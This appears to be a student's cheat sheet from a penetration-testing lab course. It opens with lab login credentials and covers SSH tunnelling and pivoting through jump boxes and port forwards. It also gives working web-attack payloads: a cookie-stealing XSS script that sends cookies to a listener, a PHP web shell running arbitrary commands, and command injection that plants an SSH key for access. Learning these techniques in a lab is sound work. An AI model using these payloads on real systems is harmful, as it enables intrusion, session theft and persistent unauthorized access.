#### Login Info
Stack#: 10
Username: DAHA-019-M
Password: oybOV5rOD7Jo
Jump: 10.50.15.68
# Operations and Scanning
Open source intel:
social medial, linkdin, whois
### Active Enumerations
#### nmap scripts
    ls /usr/share/nmap/scripts
### Control Sockets
Authenticate to JUmp box, -S create socket file to store socket s, -M uses multiplexing, Kepp this open or the connection will die. up to 17 hops deep only unising a single connection
### Create master socket:
    ssh -MS /tmp/jump student@10.50.15.68 (own ip)
    ssh -MS /tmp/demo demo1@10.50.14.70 (demo ip)

## After moving to a new box do a ping sweep:
    for i in {97..126}; do (ping -c 1 192.168.28.$i | grep "bytes from"&); done

Scan for ports on listed on hosts
### set up dynamic tunnel:
        ssh -S /tmp/demo demo -O forward -D 9050
Proxychains nmap (taget ip) 
verify port
proxychains nc (targetip) (taget port)
### to close the dynamic tunnel
        ssh -S /tmp/demo demo -O cancel -D 9050
### Add listenting port forward
    ssh -S /tmp/demo demo -O forward -L1111:192.168.28.100:80 -L 1112:192.168.28.100:2222
### Remove port forward
    ssh -S /tmp/demo demo -O cancel -L1111:192.168.28.100:80 -L 1112:192.168.28.100:2222
#### verify port is open/banner grab
    ss -ntlp | grep (port number)
## Example on how to Master socket between mulitple hosts

        ssh -MS /tmp/jump jump student@ip
        ssh -S /tmp/jump jump -O  forward -D 9050
        ssh -S /tmp/jump jump -L 1111:1.2.3.4:80 -L 1112:1.2.3.4:22

        ssh -ms /tmp/t1 cred@127.0.0.1 -p 1112
        ssh -S /tmp/jump jump -O cancel -D 9050 >>> ssh -s /tmp/t1 t1 -O farward -D 9050
        ssh -s  /tmp/t1 t1 -O forward -L 2111:2.3.4.5:22 -L 2112:2.3.4.5:80

# Web Exploitation
## Enumeration of a web server
### /robots.txt 
    allows you to see all websites within webserver that can all be searched for info
    http://127.0.0.1/robots.txt
### http-enum.nse
    A scirpt that can be used with nmao to enum the website off a webserver
    nmap --scripts=http-enum.nse <ip>
## Methods of site traversal
### Inspect websever / Console
        changeText()

### Cross-site scripting (XSS)
        <img src="http://invalid" onerror="window.open('http://10.50.XX.XX:8000/ram.png','xss','height=1,width=1');">
        setup nc -l on machine
        <script>document.location="http://<ip of nc listener:port>/Cookie_Stealer1.php?username=" + document.cookie;</script>
### stored javascript components 
        <script>alert('XSS');</script>
### ../
        
### malicous file upload
    <HTML><BODY>
    <FORM METHOD="GET" NAME="myform" ACTION="">
    <INPUT TYPE="text" NAME="cmd">
    <INPUT TYPE="submit" VALUE="Send">
    </FORM>
    <pre>
    <?php
    if($_GET['cmd']) {
    system($_GET['cmd']);
    }
    ?>
    </pre>
    </BODY></HTML>
### Command injection
use semicolons in test boxes on the webserver
##ssh key upload
### generate our key
    ssh-keygen -t rsa -b 4096
    No Passphrase
    cat /home/student/.ssh/id_rsa.pub

    #copy and paste the WHOLE key
### Prepare website > cmd injection > know users and home directories (/etc/passwd)
#### make /.ssh in the users home directory
    ;mkdir /var/www/.ssh
    ;ls -la /var/www

### upload key
    ;echo "ssh key" > /var/www/.ssh/authorized_keys #>> for append
    ;cat /car/www/.ssh/authorized_keys
### ssh into machine
        ssh -i /home/student/www/.ssh/id_rsa www-data@127.0.0.1 - p1112
    
    
        
        
